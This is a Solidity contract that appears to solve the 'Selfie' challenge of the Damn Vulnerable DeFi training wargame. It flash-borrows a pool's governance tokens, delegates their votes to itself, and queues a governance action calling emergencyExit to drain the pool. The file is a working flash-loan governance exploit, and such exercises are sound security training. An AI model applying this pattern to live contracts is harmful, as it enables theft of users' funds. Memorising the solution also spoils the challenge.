// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {SimpleGovernance} from "./SimpleGovernance.sol";
import {SelfiePool} from "./SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {DamnValuableVotes} from "../DamnValuableVotes.sol";

contract SelfieExploiter is IERC3156FlashBorrower {
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    SimpleGovernance public immutable simpleGovernance;
    SelfiePool public immutable selfiePool;
    DamnValuableVotes public immutable token;
    address public immutable recovery;

    uint256 public actionId = 0;

    constructor(SimpleGovernance _simpleGovernance, SelfiePool _selfiePool, address _recovery) {
        simpleGovernance = _simpleGovernance;
        selfiePool = _selfiePool;
        recovery = _recovery;
        token = DamnValuableVotes(address(selfiePool.token()));

        // pre-approve
        token.approve(address(selfiePool), token.balanceOf(address(selfiePool)));
    }

    function attack() public {
        bytes memory data = abi.encodeWithSelector(selfiePool.emergencyExit.selector, recovery);

        selfiePool.flashLoan(this, address(token), token.balanceOf(address(selfiePool)), data);
    }

    function onFlashLoan(address, address, uint256, uint256, bytes calldata data) external override returns (bytes32) {
        // we have the funds here and we want to queue an action since have the voting power
        token.delegate(address(this));

        actionId = simpleGovernance.queueAction(address(selfiePool), 0, data);

        return CALLBACK_SUCCESS;
    }
}
